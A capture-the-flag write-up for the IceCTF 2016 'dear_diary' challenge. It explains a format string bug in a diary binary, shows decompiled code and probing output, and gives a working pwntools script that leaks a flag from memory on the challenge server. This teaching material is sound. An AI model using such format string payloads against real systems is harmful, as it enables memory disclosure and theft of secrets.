#Nullp0inter's dear_diary write up for IceCTF 2016

##Dear_Diary Pwn 60pts
We all want to keep our secrets secure and what is more important than our precious diary entries? We made this highly secure diary service that is sure to keep all your boy crushes and edgy poems safe from your parents. 

nc diary.vuln.icec.tf 6501

## Write Up
In this challenge we are given a download link for a elf-32bit binary. The
idea is that this binary acts as a diary of sorts, allowing you to write an entry,
print the LATEST entry only, or quit.

```
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> 
```
I began by playing around and quickly found that the diary program would occasionally exit right after your entry and print 'rude!' like so:
```
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> 1 
Tell me all your secrets: never gonna give you up, never gonna let you down 
rude!
```

Thats a bit odd for a diary, just one entry and calling you rude as well. After playing around a little bit process of elemination shows the program does not allow specifically "n", that is to say the lowercase (uppercase is fine), which is undoubtedly also strange behavior. My mind is already screaming Format String Vulnerability but just to verify I tried to enter `AAAA%x%x%x%x%x%x%x` as an entry and
print it:
```
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> 1
Tell me all your secrets: AAAA%x%x%x%x%x%x%x

1. add entry
2. print latest entry
3. quit
> 2
AAAA6ef757eed5fff4d948fff4ed480a8c521f00

1. add entry
2. print latest entry
3. quit
> 
```

Clearly its not handling format strings properly according to the output above. This is good for us because it means we potentially have arbitrary read access in memory. To figure out how to use this effectively however we need to do some reversing. I started out using peda+gdb `disass main` and `pdisass main` but my reversing skills are pretty bad so I just cheated and used IDA.

According to IDA we have the following functions:

#####main:
```C
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
    int v3; // eax@2
    unsigned int v4; // [sp+14h] [bp-140Ch]@1
    int v5; // [sp+18h] [bp-1408h]@8
    int v6; // [sp+1418h] [bp-8h]@2
    int v7; // [sp+141Ch] [bp-4h]@1

    v7 = *MK_FP(__GS__, 20);
    flag();
    v4 = 0;
    puts("-- Diary 3000 --");
    fflush(stdout);
    while ( 1 )
    {
        while ( 1 )
        {
            print_menu();
            fgets((char *)&v6, 4, stdin);
            v3 = atoi((const char *)&v6);
            if ( v3 != 2 )
                break;
            if ( v4 )
                print_entry((const char *)&v5 + 256 * (v4 - 1));
            else
                puts("No entry found!");
        }
        if ( v3 == 3 )
            break;
        if ( v3 == 1 )
        {
            if ( v4 > 0x13 )
            {
                puts("diary ran out of space..");
                exit(1);
            }
            add_entry((char *)&v5 + 256 * v4++);
        }
        else
        {
            puts("Invalid input.");
        }
    }
    exit(0);
}
```

#####print_menu:
```C
int print_menu()
{
    int v0; // ST1C_4@1
    v0 = *MK_FP(__GS__, 20);
    printf("\n1. add entry\n2. print latest entry\n3. quit\n> ");
    fflush(stdout);
    return *MK_FP(__GS__, 20) ^ v0;
}
```

#####add_entry:
```C
int __cdecl add_entry(char *a1)
{
    int v2; // [sp+1Ch] [bp-Ch]@1
    v2 = *MK_FP(__GS__, 20);
    printf("Tell me all your secrets: ");
    fflush(stdout);
    fgets(a1, 256, stdin);
    if ( strchr(a1, 110) )
    {
        puts("rude!");
        exit(1);
    }
    return *MK_FP(__GS__, 20) ^ v2;
}
```

#####print_entry:
```C
int __cdecl print_entry(const char *a1)
{
    int v1; // ST1C_4@1
    v1 = *MK_FP(__GS__, 20);
    printf(a1);
    fflush(stdout);
    return *MK_FP(__GS__, 20) ^ v1;
}
```

#####flag:
```C
int flag()
{
    int v0; // ST1C_4@1
    int fd; // ST18_4@1
    v0 = *MK_FP(__GS__, 20);
    fd = open("./flag.txt", 0);
    read(fd, &data, 0x100u);
    return *MK_FP(__GS__, 20) ^ v0;
}
```

AHA! Just as I thought, according to the print_entry function they didn't properly format our input. This simply confirms what we already know however. Much more interesting is that function `flag()` we see called first thing in `main()`.

Taking a look at the flag function we see that it simply reads a file flag.txt into some part of memory. Checking the reference in IDA we find that its address is 0x0804a0a0. This is good we now know where in memory our flag is going to be.

I decided I would test this myself locally before trying it on the remote server. To do this I needed to do two things:
- Create a file in the same directory as the binary called `flag.txt` (into which I put the text `MeCTF{fecking_success!}`
- Learn how to use pwntools as the menu means you can't simply do `python -c "print <exploit_string>"`

The former was obviously easy, the latter required a bit of assistance but eventually what I figured it out. I had my binary in ~/Downloads/dear_diary (I removed the hash in the name) so I created the flag file there as well. For this to work I needed to know where my format string was actually stored on the stack. The reason for this is because if the very first thing I write is an address rather than AAAA then if I can find where it is offset on the stack I can use %s to dereference the address as a pointer to a string and read it as such. Obviously I want to put 0x0804a0a0 onto the stack as that is where the flag is held (as seen in the flag function above) but to do this I decided to first craft some test strings and use gdb.

Using python I came up with a quick command to generate strings to test with, `print 'AAAA'+'.%x'*NUM` where I kept increasing NUM starting from around 10. This generated strings such as `AAAA.%x.%x.%x.%x.%x.%x` and so on. Eventually I stumbled on the magic number, 18 %x's giving me `AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x` and testing it out in the program I get:

```
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> 1                                                         
Tell me all your secrets: AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x

1. add entry
2. print latest entry
3. quit
> 2
AAAA.6e.f7622ed5.ffdc3188.ffdc4588.0.a.39402f00.f77a5000.f77a5000.ffdc4598.804888c.ffdc3188.4.f77a55a0.0.0.1.41414141

1. add entry
2. print latest entry
3. quit
>
```

Awesome! We can see by the 41414141 that we know where our format string ('AAAA') is going to be stored on the stack, 18 items down. Knowing this we can use a little bit of syntactic magic and do %18$x to confirm it is infact the 18th item:

```
1. add entry
2. print latest entry
3. quit
> 1
Tell me all your secrets: AAAA%18$x

1. add entry
2. print latest entry
3. quit
> 2
AAAA41414141
```

So that's fantastic, we now know that the 18th item down is going to be our format string, this means we can dereference it using %18$s and the only issue now is getting it to be our flag address, 0x0804a0a0, rather than 'AAAA'. Normally we could just do `python -c "print '<address_in_little_endian>'+'%18$s'"` to properly parse the hex and pass it but due to that damn menu, this obviously won't work. Instead this is where pwntools comes in. Fire up python and do the following:

```Python
from pwn import * # import all pwntools libraries

payload = p32(134520992)+'%18$s' # pack the integer to hex and append %18$s as the payload
p = process('/home/nullp0inter/Downloads/dear_diary') # open the binary locally as a process
p.recv() # read from the local binary
p.sendline('1') # send '1' to the local binary so we select the option to add entry
p.recv() # read more from local binary
p.sendline(payload) # send the payload we crafted to the binary
p.interactive() # pop open an interactive shell for us to intereact with the binary
```

So a quick note about the above, I got that number (134520992) by converting the hex 0x0804a0a0 to an integer online and did things this way due to my own lack of python knowledge, I am certain there is a substantially better way to do this but I couldn't really think of it or find it (I was focused on solving this quickly rather than elegantly). That said, the payload is the address of the flag followed by %18$s which will try to derefence that address and read it as a string. When we run this we get:

```
[+] Starting local process '/home/nullp0inter/Downloads/dear_diary': Done
[*] Switching to interactive mode

1. add entry
2. print latest entry
3. quit
> $ 2
\xa0\xa0\x0MeCTF{FECKING_SUCCESS}


1. add entry
2. print latest entry
3. quit
> $  
```

THERE IT IS! Our local flag! So our exploit worked. We only need to make one small change for this to work on the remote server. We change the line (or comment it out and add the new line) `p = process('/home/nullp0inter/Downloads/dear_diary')` to `p = remote('diary.vuln.icec.tf',6501)` which is the nc address we were given in the problem. Once that change has been made we can run it again and we get:

```
Tell me all your secrets: 
1. add entry
2. print latest entry
3. quit
> $ 2
\xa0\xa0\x0IceCTF{this_thing_is_just_sitting_here}


1. add entry
2. print latest entry
3. quit
> $  
```

There it is! The flag is `IceCTF{this_thing_is_just_sitting_here}`


##Special Thanks:
Special thanks to both past and present members of my club, wcsc, who helped me out with this whether directly or otherwise. The support and information I gained while solving this challenge has been invaluable.
